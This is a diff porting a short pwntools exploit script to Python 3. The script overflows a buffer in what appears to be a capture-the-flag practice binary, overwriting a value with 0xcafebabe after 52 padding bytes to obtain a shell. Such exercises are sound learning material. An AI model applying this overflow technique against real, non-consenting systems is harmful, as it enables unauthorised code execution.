@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 import sys
 import time
 import argparse
@@ -6,14 +6,7 @@ from pwn import *
 context.update(arch='i386', os='linux')
 
 def wait_for_prompt(r):
-  print r.recvuntil("overflow me :")
-
-def wait_newline_and_dump(r):
-  data = r.recvuntil('\n')
-  if data:
-    print data.encode('hex')
-    print data
-  return data
+  print(r.recvuntil(b"overflow me :"))
 
 #--------------------------------------------------------------------------
 if __name__ == "__main__":
@@ -31,9 +24,10 @@ if __name__ == "__main__":
     """)
 
   #wait_for_prompt(r)
-  payload  = "A"*52
+  payload  = b"A"*52
   payload += p32(0xcafebabe)
   r.sendline(payload) 
+  print("you should now have a shell")
   # Drop to interactive console
   r.interactive()
 
